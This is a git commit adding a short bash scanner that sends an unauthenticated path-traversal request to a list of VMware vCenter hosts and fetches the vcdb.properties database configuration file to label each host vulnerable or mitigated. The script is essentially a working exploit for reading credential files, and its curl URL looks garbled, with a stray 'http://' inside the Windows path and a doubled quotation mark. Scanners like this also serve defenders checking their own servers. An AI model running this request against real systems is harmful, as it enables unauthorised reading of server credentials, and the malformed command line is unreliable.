ec61c9e577331cd890fe2dcb6d4123aa95aff94a
Ihebski <ihebski@users.noreply.github.com>
2020-10-16 13:11:56 +0100

    Add files via upload

---
+++ mini-scanner/VMwarevCenter_path_traversal.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+#
+# Arbitrary File Read vulnerability in VMware vCenter(Unauthenticated)
+#
+# Usage :
+# $ echo "host1 host2 host3" | ./scanner
+# $ cat myservers | ./scanner
+#
+servers="$(cat)"
+
+for servers in $servers; do
+	# command test here
+curl -vk --path-as-is "https://$servers/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\http://vcdb.properties"" 2>&1 | grep "driver" >/dev/null && echo "VULNERABLE: $servers" || echo "MITIGATED: $servers"    
+done
